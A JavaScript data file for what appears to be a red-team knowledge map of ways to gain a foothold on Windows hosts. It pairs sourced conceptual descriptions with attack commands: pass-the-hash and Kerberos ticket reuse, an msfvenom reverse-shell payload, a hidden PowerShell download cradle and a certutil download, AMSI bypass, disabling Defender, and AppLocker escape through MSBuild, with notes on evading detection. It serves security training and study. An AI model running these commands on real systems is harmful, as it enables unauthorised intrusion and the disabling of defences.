import { mitre, r } from '../lib.js';

/**
 * Windows foothold on-ramp — a SLIM, hand-curated front-end for the Win-PE map.
 *
 * It replaces the old auto-generated front-end (kb-win-foothold), which duplicated the AD
 * map's lateral-movement / credential lanes and carried a generated voice. The way ONTO a
 * Windows host is two short lanes that both converge on `pe-start` (Local Foothold), where
 * the curated priv-esc triage takes over:
 *   - Credentialed Logon — broken by AUTH METHOD (password/key, NTLM hash, Kerberos),
 *     because what you hold decides how you authenticate. The AD map carries the full
 *     lateral-movement detail; this is just the on-ramp.
 *   - Execution & Evasion — turn a code-execution primitive into a stable shell, and get
 *     your tooling past the host's defences (AMSI/AV, AppLocker/Constrained Language Mode).
 *
 * Voice matches the curated core: terse summaries, short `requires`, primary sources only.
 */
/** @type {import('../schema.js').TechniqueNodeDef[]} */
export const winFootholdNodes = [
  {
    "id": "win-foothold-start",
    "label": "Get a Foothold",
    "phase": "access",
    "kind": "start",
    "summary": "Distinguish connectivity, sign-in, and remote-session access.",
    "description": "A reachable Windows computer, an authenticated account, and permission to use a remote session are separate concepts. Authentication verifies identity; authorization determines permitted resources and actions. Remote Desktop Services, for example, delivers desktops or individual applications to authorized users. Network reachability alone does not establish a usable session or administrative authority.",
    "references": [
      {
        "label": "Microsoft, Windows Authentication Concepts",
        "url": "https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/windows-authentication-concepts",
        "section": "Authentication and authorization: A travel analogy; Security principals and accounts",
        "kind": "primary"
      },
      {
        "label": "Microsoft, Remote Desktop Services overview",
        "url": "https://learn.microsoft.com/en-us/windows-server/remote/remote-desktop-services/overview",
        "kind": "primary",
        "section": "Introduction"
      },
      {
        "label": "HackTricks, Windows Local Privilege Escalation",
        "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html"
      }
    ],
    "review": {
      "status": "source-reviewed",
      "reviewedAt": "2026-09-07",
      "reviewedBy": "Codex",
      "reviewerType": "ai",
      "scope": "Selected identity and authorization claims in this overview. Excludes commands, tools, prerequisites, connection outcomes, route viability, and ATT&CK mappings. Navigation labels are project conventions.",
      "reviewedContent": {
        "description": "A reachable Windows computer, an authenticated account, and permission to use a remote session are separate concepts. Authentication verifies identity; authorization determines permitted resources and actions. Remote Desktop Services, for example, delivers desktops or individual applications to authorized users. Network reachability alone does not establish a usable session or administrative authority.",
        "id": "win-foothold-start",
        "kind": "start",
        "label": "Get a Foothold",
        "phase": "access",
        "references": [
          {
            "kind": "primary",
            "label": "Microsoft, Windows Authentication Concepts",
            "section": "Authentication and authorization: A travel analogy; Security principals and accounts",
            "url": "https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/windows-authentication-concepts"
          },
          {
            "kind": "primary",
            "label": "Microsoft, Remote Desktop Services overview",
            "section": "Introduction",
            "url": "https://learn.microsoft.com/en-us/windows-server/remote/remote-desktop-services/overview"
          },
          {
            "label": "HackTricks, Windows Local Privilege Escalation",
            "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html"
          }
        ],
        "summary": "Distinguish connectivity, sign-in, and remote-session access."
      },
      "claims": [
        {
          "text": "Authentication and authorization concern identity and permitted access respectively.",
          "section": "Microsoft, Windows Authentication Concepts — Authentication and authorization: A travel analogy",
          "sources": [
            "https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/windows-authentication-concepts"
          ]
        },
        {
          "text": "Remote Desktop Services provides authorized users with access to desktops or individual RemoteApp applications.",
          "section": "Microsoft, Remote Desktop Services overview — What is Remote Desktop Services?",
          "sources": [
            "https://learn.microsoft.com/en-us/windows-server/remote/remote-desktop-services/overview"
          ]
        }
      ]
    }
  },

  // ── Lane: Credentialed Logon (by auth method) ──────────────────────────────────
  {
    "id": "win-cat-logon",
    "mitre": {
      "id": "T1021",
      "url": "https://attack.mitre.org/techniques/T1021/"
    },
    "references": [
      {
        "label": "Microsoft, Windows Authentication Concepts",
        "url": "https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/windows-authentication-concepts",
        "section": "Authentication and authorization: A travel analogy; Security principals and accounts",
        "kind": "primary"
      },
      {
        "label": "Microsoft, Access Tokens",
        "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens",
        "section": "Introduction",
        "kind": "primary"
      }
    ],
    "label": "Credentialed Logon",
    "phase": "access",
    "kind": "category",
    "summary": "Understand authentication and the Windows security context.",
    "description": "Authentication verifies an identity; authorization determines which resources and actions that identity may access. Windows represents a process or thread's security context with an access token containing account identity and privileges. These concepts explain why an authenticated identity and administrative authority are separate questions.",
    "review": {
      "status": "source-reviewed",
      "reviewedAt": "2026-09-07",
      "reviewedBy": "Codex",
      "reviewerType": "ai",
      "scope": "Selected conceptual claims in this category overview only. Does not cover linked techniques, commands, connection outcomes, or ATT&CK mapping suitability.",
      "reviewedContent": {
        "description": "Authentication verifies an identity; authorization determines which resources and actions that identity may access. Windows represents a process or thread's security context with an access token containing account identity and privileges. These concepts explain why an authenticated identity and administrative authority are separate questions.",
        "id": "win-cat-logon",
        "kind": "category",
        "label": "Credentialed Logon",
        "mitre": {
          "id": "T1021",
          "url": "https://attack.mitre.org/techniques/T1021/"
        },
        "phase": "access",
        "references": [
          {
            "kind": "primary",
            "label": "Microsoft, Windows Authentication Concepts",
            "section": "Authentication and authorization: A travel analogy; Security principals and accounts",
            "url": "https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/windows-authentication-concepts"
          },
          {
            "kind": "primary",
            "label": "Microsoft, Access Tokens",
            "section": "Introduction",
            "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens"
          }
        ],
        "summary": "Understand authentication and the Windows security context."
      },
      "claims": [
        {
          "text": "Authentication verifies identity, while authorization governs permitted access.",
          "section": "Microsoft, Windows Authentication Concepts — Authentication and authorization: A travel analogy",
          "sources": [
            "https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/windows-authentication-concepts"
          ]
        },
        {
          "text": "An access token describes a process or thread's security context, including account identity and privileges.",
          "section": "Microsoft, Access Tokens — Introduction",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens"
          ]
        }
      ]
    }
  },
  {
    "id": "win-logon-password",
    "label": "Password / Key Logon",
    "phase": "access",
    "summary": "Distinguish password authentication from SSH public-key authentication.",
    "description": "A password is a secret value supplied during password authentication. SSH public-key authentication instead verifies a digital signature produced with the user's private key. These are different authentication methods. The authentication result identifies the account; access to particular resources and operations is an authorization decision.",
    "requires": [
      "A valid account password or key",
      "A remote-access service the account may use (WinRM/RDP/SMB/SSH)"
    ],
    "commands": [
      {
        "label": "WinRM PowerShell shell",
        "code": "evil-winrm -i <host> -u <user> -p '<pass>'",
        "lang": "bash"
      },
      {
        "label": "SMB service exec (nxc)",
        "code": "nxc smb <host> -u <user> -p '<pass>' -x 'whoami'",
        "lang": "bash"
      },
      {
        "label": "RDP session",
        "code": "xfreerdp /u:<user> /p:'<pass>' /v:<host> /cert:ignore",
        "lang": "bash"
      },
      {
        "label": "SSH (OpenSSH on Windows)",
        "code": "ssh <user>@<host>",
        "lang": "bash"
      }
    ],
    "tools": [
      {
        "name": "evil-winrm",
        "url": "https://github.com/Hackplayers/evil-winrm"
      },
      {
        "name": "NetExec",
        "url": "https://github.com/Pennyw0rth/NetExec"
      }
    ],
    "mitre": {
      "id": "T1021",
      "url": "https://attack.mitre.org/techniques/T1021/"
    },
    "references": [
      {
        "label": "NIST SP 800-63B-4, Authenticators",
        "url": "https://pages.nist.gov/800-63-4/sp800-63b/authenticators/",
        "section": "3.1.1 Passwords; 3.1.1.2 Password Verifiers",
        "kind": "primary"
      },
      {
        "label": "RFC 4252, SSH Authentication Protocol",
        "url": "https://www.rfc-editor.org/rfc/rfc4252.html",
        "section": "7. Public Key Authentication Method",
        "kind": "primary"
      },
      {
        "label": "Microsoft, Windows Authentication Concepts",
        "url": "https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/windows-authentication-concepts",
        "section": "Authentication and authorization: A travel analogy",
        "kind": "primary"
      },
      {
        "label": "MITRE ATT&CK, Remote Services (T1021)",
        "url": "https://attack.mitre.org/techniques/T1021/"
      },
      {
        "label": "HackTricks, Lateral Movement",
        "url": "https://book.hacktricks.wiki/en/windows-hardening/lateral-movement/index.html"
      }
    ],
    "opsec": "Each logon writes a 4624 event (logon type 3 for SMB/WinRM, 10 for RDP); evil-winrm and service execution are signatured. Prefer the protocol the account already uses.",
    "review": {
      "status": "source-reviewed",
      "reviewedAt": "2026-09-07",
      "reviewedBy": "Codex",
      "reviewerType": "ai",
      "scope": "Selected conceptual claims in the account, credential, and authentication explanation. Excludes commands, tools, prerequisites, applicability, connection outcomes, route viability, and ATT&CK mappings. Navigation labels remain project conventions.",
      "reviewedContent": {
        "commands": [
          {
            "code": "evil-winrm -i <host> -u <user> -p '<pass>'",
            "label": "WinRM PowerShell shell",
            "lang": "bash"
          },
          {
            "code": "nxc smb <host> -u <user> -p '<pass>' -x 'whoami'",
            "label": "SMB service exec (nxc)",
            "lang": "bash"
          },
          {
            "code": "xfreerdp /u:<user> /p:'<pass>' /v:<host> /cert:ignore",
            "label": "RDP session",
            "lang": "bash"
          },
          {
            "code": "ssh <user>@<host>",
            "label": "SSH (OpenSSH on Windows)",
            "lang": "bash"
          }
        ],
        "description": "A password is a secret value supplied during password authentication. SSH public-key authentication instead verifies a digital signature produced with the user's private key. These are different authentication methods. The authentication result identifies the account; access to particular resources and operations is an authorization decision.",
        "id": "win-logon-password",
        "label": "Password / Key Logon",
        "mitre": {
          "id": "T1021",
          "url": "https://attack.mitre.org/techniques/T1021/"
        },
        "opsec": "Each logon writes a 4624 event (logon type 3 for SMB/WinRM, 10 for RDP); evil-winrm and service execution are signatured. Prefer the protocol the account already uses.",
        "phase": "access",
        "references": [
          {
            "kind": "primary",
            "label": "NIST SP 800-63B-4, Authenticators",
            "section": "3.1.1 Passwords; 3.1.1.2 Password Verifiers",
            "url": "https://pages.nist.gov/800-63-4/sp800-63b/authenticators/"
          },
          {
            "kind": "primary",
            "label": "RFC 4252, SSH Authentication Protocol",
            "section": "7. Public Key Authentication Method",
            "url": "https://www.rfc-editor.org/rfc/rfc4252.html"
          },
          {
            "kind": "primary",
            "label": "Microsoft, Windows Authentication Concepts",
            "section": "Authentication and authorization: A travel analogy",
            "url": "https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/windows-authentication-concepts"
          },
          {
            "label": "MITRE ATT&CK, Remote Services (T1021)",
            "url": "https://attack.mitre.org/techniques/T1021/"
          },
          {
            "label": "HackTricks, Lateral Movement",
            "url": "https://book.hacktricks.wiki/en/windows-hardening/lateral-movement/index.html"
          }
        ],
        "requires": [
          "A valid account password or key",
          "A remote-access service the account may use (WinRM/RDP/SMB/SSH)"
        ],
        "summary": "Distinguish password authentication from SSH public-key authentication.",
        "tools": [
          {
            "name": "evil-winrm",
            "url": "https://github.com/Hackplayers/evil-winrm"
          },
          {
            "name": "NetExec",
            "url": "https://github.com/Pennyw0rth/NetExec"
          }
        ]
      },
      "claims": [
        {
          "text": "A password is a secret value used as a knowledge-based authentication factor.",
          "section": "NIST SP 800-63B-4, Authenticators — 3.1.1 Passwords",
          "sources": [
            "https://pages.nist.gov/800-63-4/sp800-63b/authenticators/"
          ]
        },
        {
          "text": "SSH public-key authentication verifies a signature produced with the user's private key.",
          "section": "RFC 4252, SSH Authentication Protocol — 7. Public Key Authentication Method",
          "sources": [
            "https://www.rfc-editor.org/rfc/rfc4252.html"
          ]
        },
        {
          "text": "Successful authentication does not by itself guarantee authorization to use a resource.",
          "section": "Microsoft, Windows Authentication Concepts — Authentication and authorization: A travel analogy",
          "sources": [
            "https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/windows-authentication-concepts"
          ]
        }
      ]
    }
  },
  {
    id: 'win-logon-pth',
    label: 'Pass-the-Hash (NTLM)',
    phase: 'access',
    summary: 'NT hash into NTLM auth over SMB/PsExec or WinRM.',
    description:
      'When you hold an account\'s NT hash but not its cleartext, authenticate with the hash directly over NTLM rather than cracking it. SMB service execution (psexec/smbexec) needs local admin on the target; WinRM needs Remote Management Users. NTLM must be permitted (no Kerberos-only or Protected Users enforcement on the account).',
    requires: ['An account NT hash', 'NTLM permitted, and local admin (SMB) or Remote Management Users (WinRM) on the target'],
    commands: [
      { label: 'SMB exec with the hash', code: r`nxc smb <host> -u <user> -H <NThash> -x 'whoami'`, lang: 'bash' },
      { label: 'PsExec SYSTEM shell', code: r`impacket-psexec -hashes :<NThash> <user>@<host>`, lang: 'bash' },
      { label: 'WinRM with the hash', code: r`evil-winrm -i <host> -u <user> -H <NThash>`, lang: 'bash' },
    ],
    tools: [
      { name: 'Impacket', url: 'https://github.com/fortra/impacket' },
      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
      { name: 'evil-winrm', url: 'https://github.com/Hackplayers/evil-winrm' },
    ],
    mitre: mitre('T1550.002'),
    references: [
      { label: 'MITRE ATT&CK, Pass the Hash (T1550.002)', url: 'https://attack.mitre.org/techniques/T1550/002/' },
      { label: 'The Hacker Recipes, Pass the Hash', url: 'https://www.thehacker.recipes/ad/movement/ntlm/pth' },
    ],
    opsec: 'PtH triggers NTLM logons (4624 type 3) with the machine reporting NTLM where Kerberos is expected. Modern EDR flags psexec service creation (7045).',
  },
  {
    "id": "win-logon-kerberos",
    "label": "Kerberos Logon",
    "phase": "access",
    "summary": "Distinguish Kerberos tickets, credential caches, and service authorization.",
    "description": "Kerberos authenticates principals through a trusted ticket service. A ticket-granting ticket (TGT) is used with the ticket-granting service, while a service ticket concerns a particular service. A credential cache is a container: MIT's FILE cache format stores a sequence of credentials with ticket, key, principal, and time information. A cache file and an individual ticket are therefore different objects. Kerberos authentication and the application's authorization decision remain distinct.",
    "requires": [
      "A Kerberos TGT (ccache) or an AES/NT key",
      "Target reachable by its Kerberos FQDN/SPN; clock within 5 minutes of the KDC",
      "/etc/krb5.conf defining the realm (UPPERCASE) and its KDC, with KRB5CCNAME pointing at the ccache from the prior step; a missing or wrong krb5.conf is the most common silent failure"
    ],
    "commands": [
      {
        "label": "Request a TGT, then use it",
        "code": "getTGT.py <domain>/<user> -hashes :<NThash>\nexport KRB5CCNAME=<user>.ccache",
        "lang": "bash"
      },
      {
        "label": "WinRM over Kerberos",
        "code": "evil-winrm -i <host.fqdn> -r <REALM>",
        "lang": "bash"
      },
      {
        "label": "SMB with the ticket cache",
        "code": "nxc smb <host.fqdn> --use-kcache -x 'whoami'",
        "lang": "bash"
      },
      {
        "label": "Fix clock skew (KRB_AP_ERR_SKEW)",
        "code": "sudo ntpdate -u <dc>   # or wrap the tool in faketime to avoid changing system time",
        "lang": "bash"
      },
      {
        "label": "On-host TGT and inject (Rubeus)",
        "code": "Rubeus.exe asktgt /user:<user> /rc4:<NThash> /ptt",
        "lang": "powershell"
      }
    ],
    "tools": [
      {
        "name": "Impacket",
        "url": "https://github.com/fortra/impacket"
      },
      {
        "name": "Rubeus",
        "url": "https://github.com/GhostPack/Rubeus"
      }
    ],
    "mitre": {
      "id": "T1550.003",
      "url": "https://attack.mitre.org/techniques/T1550/003/"
    },
    "references": [
      {
        "label": "RFC 4120, Kerberos V5",
        "url": "https://www.rfc-editor.org/rfc/rfc4120.html",
        "section": "1.1 The Kerberos Protocol; 1.4 Authorization",
        "kind": "primary"
      },
      {
        "label": "MIT Kerberos, Credential cache file format",
        "url": "https://web.mit.edu/kerberos/krb5-latest/doc/formats/ccache_file_format.html",
        "section": "Opening format description; Credential format",
        "kind": "primary"
      },
      {
        "label": "MITRE ATT&CK, Pass the Ticket (T1550.003)",
        "url": "https://attack.mitre.org/techniques/T1550/003/"
      },
      {
        "label": "HackTricks, Pass the Ticket",
        "url": "https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/pass-the-ticket.html"
      },
      {
        "label": "Duckwall & Delpy, Abusing Microsoft Kerberos (Black Hat USA 2014)",
        "url": "https://blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don%27t-Get-It-wp.pdf"
      }
    ],
    "opsec": "Kerberos logons blend in better than NTLM, but ticket requests for an unusual host/SPN and clock-skew errors are visible to the KDC.",
    "review": {
      "status": "source-reviewed",
      "reviewedAt": "2026-09-07",
      "reviewedBy": "Codex",
      "reviewerType": "ai",
      "scope": "Selected conceptual claims in the account, credential, and authentication explanation. Excludes commands, tools, prerequisites, applicability, connection outcomes, route viability, and ATT&CK mappings. Navigation labels remain project conventions.",
      "reviewedContent": {
        "commands": [
          {
            "code": "getTGT.py <domain>/<user> -hashes :<NThash>\nexport KRB5CCNAME=<user>.ccache",
            "label": "Request a TGT, then use it",
            "lang": "bash"
          },
          {
            "code": "evil-winrm -i <host.fqdn> -r <REALM>",
            "label": "WinRM over Kerberos",
            "lang": "bash"
          },
          {
            "code": "nxc smb <host.fqdn> --use-kcache -x 'whoami'",
            "label": "SMB with the ticket cache",
            "lang": "bash"
          },
          {
            "code": "sudo ntpdate -u <dc>   # or wrap the tool in faketime to avoid changing system time",
            "label": "Fix clock skew (KRB_AP_ERR_SKEW)",
            "lang": "bash"
          },
          {
            "code": "Rubeus.exe asktgt /user:<user> /rc4:<NThash> /ptt",
            "label": "On-host TGT and inject (Rubeus)",
            "lang": "powershell"
          }
        ],
        "description": "Kerberos authenticates principals through a trusted ticket service. A ticket-granting ticket (TGT) is used with the ticket-granting service, while a service ticket concerns a particular service. A credential cache is a container: MIT's FILE cache format stores a sequence of credentials with ticket, key, principal, and time information. A cache file and an individual ticket are therefore different objects. Kerberos authentication and the application's authorization decision remain distinct.",
        "id": "win-logon-kerberos",
        "label": "Kerberos Logon",
        "mitre": {
          "id": "T1550.003",
          "url": "https://attack.mitre.org/techniques/T1550/003/"
        },
        "opsec": "Kerberos logons blend in better than NTLM, but ticket requests for an unusual host/SPN and clock-skew errors are visible to the KDC.",
        "phase": "access",
        "references": [
          {
            "kind": "primary",
            "label": "RFC 4120, Kerberos V5",
            "section": "1.1 The Kerberos Protocol; 1.4 Authorization",
            "url": "https://www.rfc-editor.org/rfc/rfc4120.html"
          },
          {
            "kind": "primary",
            "label": "MIT Kerberos, Credential cache file format",
            "section": "Opening format description; Credential format",
            "url": "https://web.mit.edu/kerberos/krb5-latest/doc/formats/ccache_file_format.html"
          },
          {
            "label": "MITRE ATT&CK, Pass the Ticket (T1550.003)",
            "url": "https://attack.mitre.org/techniques/T1550/003/"
          },
          {
            "label": "HackTricks, Pass the Ticket",
            "url": "https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/pass-the-ticket.html"
          },
          {
            "label": "Duckwall & Delpy, Abusing Microsoft Kerberos (Black Hat USA 2014)",
            "url": "https://blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don%27t-Get-It-wp.pdf"
          }
        ],
        "requires": [
          "A Kerberos TGT (ccache) or an AES/NT key",
          "Target reachable by its Kerberos FQDN/SPN; clock within 5 minutes of the KDC",
          "/etc/krb5.conf defining the realm (UPPERCASE) and its KDC, with KRB5CCNAME pointing at the ccache from the prior step; a missing or wrong krb5.conf is the most common silent failure"
        ],
        "summary": "Distinguish Kerberos tickets, credential caches, and service authorization.",
        "tools": [
          {
            "name": "Impacket",
            "url": "https://github.com/fortra/impacket"
          },
          {
            "name": "Rubeus",
            "url": "https://github.com/GhostPack/Rubeus"
          }
        ]
      },
      "claims": [
        {
          "text": "Kerberos distinguishes a ticket for an application service from a TGT used with the ticket-granting service.",
          "section": "RFC 4120, Kerberos V5 — 1.1 The Kerberos Protocol",
          "sources": [
            "https://www.rfc-editor.org/rfc/rfc4120.html"
          ]
        },
        {
          "text": "MIT's FILE credential cache stores a sequence of credentials whose fields include principals, key data, timestamps, and a ticket.",
          "section": "MIT Kerberos, Credential cache file format — Opening format description; Credential format",
          "sources": [
            "https://web.mit.edu/kerberos/krb5-latest/doc/formats/ccache_file_format.html"
          ]
        },
        {
          "text": "Kerberos authentication alone does not authorize a client to use an application service.",
          "section": "RFC 4120, Kerberos V5 — 1.4 Authorization",
          "sources": [
            "https://www.rfc-editor.org/rfc/rfc4120.html"
          ]
        }
      ]
    }
  },

  // ── Lane: Code Execution (unlike the credential lane it doesn't fork, so no folder;
  //     defense evasion moved OUT to the shared gate off Local Foothold, below) ──
  {
    id: 'win-exec-foothold',
    label: 'Code Execution',
    phase: 'execution',
    summary: 'Turn a one-shot code-exec primitive into a stable interactive session.',
    description:
      'From a fragile or one-shot primitive (web RCE, command injection, a delivered payload), get a reliable shell: generate a payload, stage it onto the host, trigger a callback to your listener, then stabilise the session. The AD map covers reusing the resulting access to move on.',
    requires: ['A code-execution primitive on the target', 'An outbound path to your listener (or an inbound port you can reach)'],
    commands: [
      { label: 'Generate a payload', code: r`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<you> LPORT=443 -f exe -o s.exe`, lang: 'bash' },
      { label: 'Catch the shell', code: r`ncat -lvnp 443     # or OpenBSD nc -lvn 443 (port positional); or msfconsole: use exploit/multi/handler`, lang: 'bash' },
      { label: 'PowerShell download cradle', code: r`powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<you>/a.ps1')"`, lang: 'powershell' },
      { label: 'Stage tooling onto the host', code: r`certutil -urlcache -split -f http://<you>/t.exe %TEMP%\t.exe`, lang: 'cmd' },
    ],
    tools: [
      { name: 'Metasploit (msfvenom)', url: 'https://github.com/rapid7/metasploit-framework' },
      { name: 'Ncat (Nmap)', url: 'https://nmap.org/ncat/' },
    ],
    mitre: mitre('T1059'),
    references: [
      { label: 'MITRE ATT&CK, Command and Scripting Interpreter (T1059)', url: 'https://attack.mitre.org/techniques/T1059/' },
      { label: 'HackTricks, Reverse Shells (Windows)', url: 'https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/windows.html' },
    ],
    opsec: 'msfvenom stock payloads and certutil downloads are heavily signatured. Match the payload arch to the target and prefer a LOLBin or in-memory cradle over dropping an EXE on monitored hosts.',
  },
  // ── Shared gate: Defense Evasion. Hangs off the Local Foothold, so it applies
  //     however you got in (credentialed logon OR code-exec) — not only to RCE. ──
  {
    "id": "win-cat-evasion",
    "mitre": {
      "id": "T1685",
      "url": "https://attack.mitre.org/techniques/T1685/"
    },
    "references": [
      {
        "label": "Microsoft, Defender Antivirus in Windows",
        "url": "https://learn.microsoft.com/en-us/defender-endpoint/microsoft-defender-antivirus-windows",
        "kind": "primary",
        "section": "Introduction; Comparing active mode, passive mode, and disabled mode"
      },
      {
        "label": "Microsoft, Antimalware Scan Interface",
        "url": "https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal",
        "kind": "primary",
        "section": "Purpose; Windows components that integrate with AMSI"
      }
    ],
    "label": "Defense Evasion",
    "phase": "execution",
    "kind": "category",
    "summary": "Windows security controls and their different roles.",
    "description": "Windows includes security components even on devices without central management. Microsoft Defender Antivirus is built into Windows; its protection depends on its operating mode and configuration. AMSI connects participating applications, including PowerShell, to an antimalware provider. These components have different roles and coverage, so management status alone does not describe a device's defenses.",
    "review": {
      "status": "source-reviewed",
      "reviewedAt": "2026-09-07",
      "reviewedBy": "Codex",
      "reviewerType": "ai",
      "scope": "Conceptual claims in this category overview only. Does not cover linked techniques, commands, connection outcomes, or ATT&CK mapping suitability.",
      "reviewedContent": {
        "id": "win-cat-evasion",
        "mitre": {
          "id": "T1685",
          "url": "https://attack.mitre.org/techniques/T1685/"
        },
        "references": [
          {
            "label": "Microsoft, Defender Antivirus in Windows",
            "url": "https://learn.microsoft.com/en-us/defender-endpoint/microsoft-defender-antivirus-windows",
            "kind": "primary",
            "section": "Introduction; Comparing active mode, passive mode, and disabled mode"
          },
          {
            "label": "Microsoft, Antimalware Scan Interface",
            "url": "https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal",
            "kind": "primary",
            "section": "Purpose; Windows components that integrate with AMSI"
          }
        ],
        "label": "Defense Evasion",
        "phase": "execution",
        "kind": "category",
        "summary": "Windows security controls and their different roles.",
        "description": "Windows includes security components even on devices without central management. Microsoft Defender Antivirus is built into Windows; its protection depends on its operating mode and configuration. AMSI connects participating applications, including PowerShell, to an antimalware provider. These components have different roles and coverage, so management status alone does not describe a device's defenses."
      },
      "claims": [
        {
          "text": "Defender Antivirus is built into Windows; absence of central management does not imply absence of antivirus.",
          "section": "Microsoft, Defender Antivirus in Windows — Introduction; Comparing active mode, passive mode, and disabled mode",
          "sources": [
            "https://learn.microsoft.com/en-us/defender-endpoint/microsoft-defender-antivirus-windows"
          ]
        },
        {
          "text": "Defender Antivirus scanning and remediation differ between active, passive, and disabled modes.",
          "section": "Microsoft, Defender Antivirus in Windows — Introduction; Comparing active mode, passive mode, and disabled mode",
          "sources": [
            "https://learn.microsoft.com/en-us/defender-endpoint/microsoft-defender-antivirus-windows"
          ]
        },
        {
          "text": "AMSI is an application integration interface for antimalware scanning, including PowerShell integration.",
          "section": "Microsoft, Antimalware Scan Interface — Purpose; Windows components that integrate with AMSI",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal"
          ]
        }
      ]
    }
  },
  {
    id: 'win-evade-amsi-av',
    label: 'AMSI / Defender Evasion',
    phase: 'execution',
    summary: 'Run flagged tooling past AMSI and Defender.',
    description:
      'Your script or payload is caught by AMSI (in-memory script scanning) or Defender (on-disk and behavioural). Running fileless only reduces on-disk artifact exposure; PowerShell/script and some dynamic content can still hit AMSI and Defender behavioural/cloud detections, so use AMSI-aware obfuscation or a same-process AMSI bypass where that is the actual blocker. Where you hold admin, add an exclusion or disable real-time protection. An AMSI patch is per-process, so it must run in the same process that executes the payload.',
    requires: ['Code execution in an AMSI-instrumented host (PowerShell/.NET), or write/exec where AV blocks the artifact', 'For disabling protection or adding exclusions: local admin / SYSTEM', 'Tamper Protection OFF: on modern default Windows (10/11 + Server) TP is on by default and SILENTLY blocks Set-MpPreference -DisableRealtimeMonitoring even for SYSTEM; the cmdlets return no error but no effect. Exclusion writes are blocked only where Defender exclusion tamper protection is actually enabled (typically Intune-only or ConfigMgr-only with the documented platform/settings requirements), so do not assume every managed host blocks local exclusions'],
    commands: [
      { label: 'Confirm AMSI is the blocker', code: r`'AmsiScanBuffer' ; 'Invoke-Mimikatz'   # a known-bad string trips AMSI if it is on`, lang: 'powershell' },
      { label: 'Check Tamper Protection before relying on Set-MpPreference', code: r`(Get-MpComputerStatus).IsTamperProtected`, lang: 'powershell' },
      { label: 'Add a Defender exclusion (admin; blocked by TP on managed hosts)', code: r`Add-MpPreference -ExclusionPath C:\Windows\Temp   # Add- appends; Set-MpPreference -ExclusionPath REPLACES the whole list`, lang: 'powershell' },
      { label: 'Disable real-time protection (admin/SYSTEM; blocked by TP on default hosts)', code: r`Set-MpPreference -DisableRealtimeMonitoring $true`, lang: 'powershell' },
    ],
    tools: [
      { name: 'amsi.fail', url: 'https://amsi.fail/' },
      { name: 'Invoke-Obfuscation', url: 'https://github.com/danielbohannon/Invoke-Obfuscation' },
    ],
    mitre: mitre('T1685'),
    references: [
      { label: 'MITRE ATT&CK, Disable or Modify Tools (T1685)', url: 'https://attack.mitre.org/techniques/T1685/', kind: 'taxonomy' },
      { label: 'HackTricks, Antivirus (AV) Bypass', url: 'https://book.hacktricks.wiki/en/windows-hardening/av-bypass.html' },
    ],
    opsec: 'Successful RTP disablement/config changes commonly emit 5001/5007 (and related 5004/5010/5012 depending on what changed); Tamper Protection-blocked attempts emit 5013, and exclusion changes usually show as 5007 when they actually apply. Defender tampering is a high-signal detection. AMSI patches are loud if the patch string itself is signatured; vary it.',
  },
  {
    id: 'win-evade-appcontrol',
    label: 'AppLocker / CLM / WDAC Escape',
    phase: 'execution',
    summary: 'Escape a locked-down shell or application-control policy to run code.',
    description:
      'Execution is constrained by policy: PowerShell Constrained Language Mode (often a JEA endpoint), AppLocker, or WDAC. Run through an allowed LOLBIN (living-off-the-land binary: a trusted, signed Windows tool like MSBuild or InstallUtil, abused to run your code), fall back to the PowerShell v2 engine where it survives, or sign your payload with a recovered or forged code-signing certificate that a publisher allow-rule trusts. MSBuild and InstallUtil defeat default AppLocker and CLM but are neutered by a WDAC policy that carries the Microsoft recommended block rules; a WDAC escape generally needs a different vector (a signer/hash allow-list gap or a LOLBIN not yet on the block list).',
    requires: ['Execution inside a ConstrainedLanguage / AppLocker / WDAC context', 'An allowed LOLBIN, the PSv2 engine, or a trusted code-signing certificate'],
    commands: [
      { label: 'Check the language mode', code: r`$ExecutionContext.SessionState.LanguageMode`, lang: 'powershell' },
      { label: 'Drop to PowerShell v2 IF .NET 3.5/2.0 is present (legacy hosts / Server 2012 R2)', code: r`powershell -version 2 -ep bypass   # fails silently on default Win10/11 + Server 2016+: .NET 3.5 not installed`, lang: 'cmd' },
      { label: 'Run code via the MSBuild LOLBIN', code: r`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.csproj`, lang: 'cmd' },
    ],
    tools: [
      { name: 'LOLBAS', url: 'https://lolbas-project.github.io/' },
    ],
    mitre: mitre('T1127.001'),
    references: [
      { label: 'MITRE ATT&CK, Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)', url: 'https://attack.mitre.org/techniques/T1127/001/' },
      { label: 'LOLBAS Project', url: 'https://lolbas-project.github.io/' },
    ],
    opsec: 'Script-block logging still records what you run even in Constrained Language Mode, and signed-binary proxy execution (MSBuild/InstallUtil) is a known EDR pattern. Code-signing abuse needs a cert the target already trusts.',
  },
];

/** @type {import('../schema.js').AttackEdge[]} */
export const winFootholdEdges = [
  // Two ways in. The credential lane forks (three replay mechanics), so it's a folder;
  // code execution doesn't fork, so it's a single node.
